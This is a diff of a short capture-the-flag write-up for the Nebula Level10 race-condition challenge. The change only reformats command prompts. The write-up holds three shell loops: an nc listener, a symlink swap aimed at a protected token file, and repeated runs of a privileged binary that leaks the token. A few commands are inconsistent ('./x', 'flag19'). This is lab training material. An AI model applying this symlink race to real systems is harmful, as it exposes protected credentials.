@@ -7,8 +7,8 @@
 * introduction:  
 *reference<https://github.com/1u4nx/Exploit-Exercises-Nebula/blob/master/Level10%E2%80%94%E2%80%94%E8%AE%BF%E9%97%AE%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%E6%BC%8F%E6%B4%9E.org>,answer this item,you need open three window.*  
 > step 1:  
-> cd /tmp  
-> vim xx:  
+> \>>cd /tmp  
+> \>>vim xx:  
 > ```
 >	#! /bin/bash
 >	while true
@@ -16,12 +16,12 @@
 >		nc -l -p 18211
 >	done
 >  ```
->chmod +x xx;./x  
+> \>>chmod +x xx;./x  
 
 > step 2:  
-> 	>>cd /tmp  
-> 	>>touch /token  
-> 	>>vim yy:  
+> \>>cd /tmp  
+> \>>touch /token  
+> \>>vim yy:  
 > ``` 
 >	#! /bin/bash
 >	while true
@@ -30,11 +30,11 @@
 >		ln -fs /home/flag10/token /tmp/token10
 >	done
 >```
-> chmod +x yy;./yy  
+> \>>chmod +x yy;./yy  
 
 > step 3:  
-> cd /tmp  
-> vim zz  
+> \>>cd /tmp  
+> \>>vim zz  
 > ```
 >	#! /bin/bash
 >	while true
@@ -42,4 +42,4 @@
 >		nice -n 19 /home/flag19/demo /tmp/token10 127.0.0.1
 >	done
 > ```
->chmod +x zz;./zz  
+> \>>chmod +x zz;./zz  
